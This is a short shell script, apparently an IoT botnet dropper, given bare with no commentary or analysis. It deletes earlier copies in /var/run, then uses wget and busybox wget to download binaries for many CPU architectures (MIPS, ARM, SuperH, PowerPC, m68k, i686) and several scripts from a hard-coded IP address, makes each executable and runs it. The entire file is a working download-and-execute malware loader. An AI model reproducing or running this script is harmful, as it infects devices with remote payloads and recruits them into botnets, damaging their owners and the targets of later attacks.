#!/bin/sh
REFERENCE_HTTP="http://23.94.68.5"
REFERENCE_MIPSEL="mipsel"
REFERENCE_MIPS="mipss"
REFERENCE_SUPERH="sh4"
REFERENCE_ARM="arm7"
REFERENCE_PPC="powerpc"

rm -fr /var/run/${REFERENCE_MIPSEL} \
	/var/run/${REFERENCE_MIPS} \
	/var/run/${REFERENCE_SUPERH} \
	/var/run/${REFERENCE_ARM} \
	/var/run/${REFERENCE_PPC}

wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
wget -c ${REFERENCE_HTTP}/${REFERENCE_ARM} -P /var/run && chmod +x /var/run/${REFERENCE_ARM} && /var/run/${REFERENCE_ARM}
wget -c ${REFERENCE_HTTP}/${REFERENCE_PPC} -P /var/run && chmod +x /var/run/${REFERENCE_PPC} && /var/run/${REFERENCE_PPC}
wget -c ${REFERENCE_HTTP}/${REFERENCE_SUPERH} -P /var/run && chmod +x /var/run/${REFERENCE_SUPERH} && /var/run/${REFERENCE_SUPERH}
wget -c ${REFERENCE_HTTP}/m68 -P /var/run && chmod +x /var/run/m68 && /var/run/m68
wget -c ${REFERENCE_HTTP}/i686 -P /var/run && chmod +x /var/run/i686 && /var/run/i686
wget -c ${REFERENCE_HTTP}/wbin.sh -P /var/run && chmod +x /var/run/wbin.sh && /var/run/wbin.sh
wget -c ${REFERENCE_HTTP}/lin -P /var/run && chmod +x /var/run/lin && /var/run/lin
busybox wget -c ${REFERENCE_HTTP}/arm5 -P /var/run && chmod +x /var/run/arm5 && /var/run/arm5
busybox wget -c ${REFERENCE_HTTP}/arm4 -P /var/run && chmod +x /var/run/arm4 && /var/run/arm4